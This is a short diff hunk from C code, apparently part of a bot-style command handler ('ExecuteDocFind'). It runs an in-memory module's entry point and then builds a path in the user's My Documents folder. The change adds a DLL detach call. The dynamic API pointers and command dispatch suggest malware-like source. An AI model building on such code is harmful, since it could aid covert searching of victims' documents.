@@ -769,6 +769,7 @@ bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args)
 					func( 0, DLL_PROCESS_ATTACH, 0 );
 					DWORD dwWait = (DWORD)pWaitForSingleObject( hEvent, INFINITE );
 					pCloseHandle(hEvent);
+					func( 0, DLL_PROCESS_DETACH, 0 );
 					char path[MAX_PATH], tmpName[MAX_PATH];
 					pSHGetFolderPathA( 0, CSIDL_MYDOCUMENTS,  0, 0, path );
 					pPathAppendA( path, "search" );
